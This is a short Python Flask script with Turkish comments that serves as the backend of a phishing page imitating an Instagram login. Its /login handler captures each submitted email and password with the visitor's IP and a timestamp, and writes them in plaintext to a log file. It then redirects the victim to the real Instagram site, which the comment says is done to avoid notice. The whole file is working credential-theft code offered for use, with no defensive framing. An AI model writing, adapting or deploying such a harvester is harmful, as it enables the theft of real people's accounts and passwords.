from flask import Flask, request, redirect
import datetime

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    # Formdan gelen verileri çekiyoruz
    email = request.form.get('email')
    password = request.form.get('password')
    user_ip = request.remote_addr
    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Verileri dosyaya kaydetme
    log_entry = f"Zaman: {zaman} | IP: {user_ip} | Email: {email} | Sifre: {password}\n"
    
    with open("loglar.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)

    print(f"[!] Yeni veri geldi: {email}")

    # Kullanıcıyı gerçek siteye yönlendir (Fark edilmemek için)
    return redirect("https://www.instagram.com")

if __name__ == '__main__':
    # host='0.0.0.0' dış dünyadan erişime izin verir
    # port=80 normal HTTP trafiği içindir
    app.run(host='0.0.0.0', port=8080)
